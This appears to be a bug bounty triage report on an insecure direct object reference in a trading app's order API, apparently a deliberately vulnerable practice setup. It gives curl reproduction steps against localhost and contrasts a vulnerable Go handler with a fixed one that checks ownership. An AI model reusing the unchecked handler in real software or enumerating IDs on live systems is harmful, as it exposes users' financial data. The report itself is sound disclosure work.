# Bug Bounty Triage Report

**Title**: IDOR in Order Details Endpoint allows unauthorized access to financial data
**Severity**: High (CVSS 6.5)
**Endpoint**: `GET /api/v1/vuln/orders/:id`
**Vulnerability Type**: Insecure Direct Object Reference (IDOR) / Broken Access Control

---

## Description

The application fails to properly validate the ownership of the requested order resource. An authenticated user can manipulate the `id` parameter in the URL to access order details belonging to other users.

Middleware successfully identifies the user, but the controller/handler does not cross-reference the `user_id` from the token with the `user_id` of the fetched order.

## Impact

- **Confidentiality**: An attacker can enumerate order IDs (which are sequential integers) and harvest sensitive financial transaction details (Stock Symbol, Amount, Order Type) of the entire user base.
- **Privacy Violation**: Exposure of trading habits and potential PII associations.

**CVSS v3.1 Vector**: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` (Score: 6.5)

---

## Proof of Concept (PoC)

### Prerequisites

1.  Two accounts: Attacker (`attacker@example.com`) and Victim (`victim@example.com`).
2.  Victim creates an order (e.g., ID 1).

### Steps to Reproduce

1.  Login as **Attacker** to get a JWT.
    ```bash
    curl -X POST http://localhost:8080/login \
      -d '{"email":"attacker@example.com", "password":"password"}'
    ```
2.  Use the Attacker's token to request the Victim's order (ID 1).
    ```bash
    curl -H "Authorization: Bearer <ATTACKER_TOKEN>" \
      http://localhost:8080/api/v1/vuln/orders/1
    ```
3.  **Observe**: The API returns the JSON details of Order ID 1, despite it belonging to User 2 (Victim).

### Automated Reproduction Script

A PowerShell script `reproduce_issue.ps1` is attached to this report to automate the check.

```powershell
./reproduce_issue.ps1
```

---

## Remediation

### Recommended Fix

Implement an authorization check at the application logic layer. Ensure that the ID of the authenticated user matches the `user_id` field of the requested resource.

**Vulnerable Code (`v1_vulnerable/order_handler.go`):**

```go
// Unsafe: Directly returns order found by ID
order, _ := h.OrderUseCase.GetOrder(ctx, id)
c.JSON(200, order)
```

**Secure Code (`v1_secure/order_handler.go`):**

```go
// Secure: Check ownership
order, _ := h.OrderUseCase.GetOrder(ctx, id)
if order.UserID != ctxUser {
    c.AbortWithStatus(403) // Forbidden
    return
}
c.JSON(200, order)
```
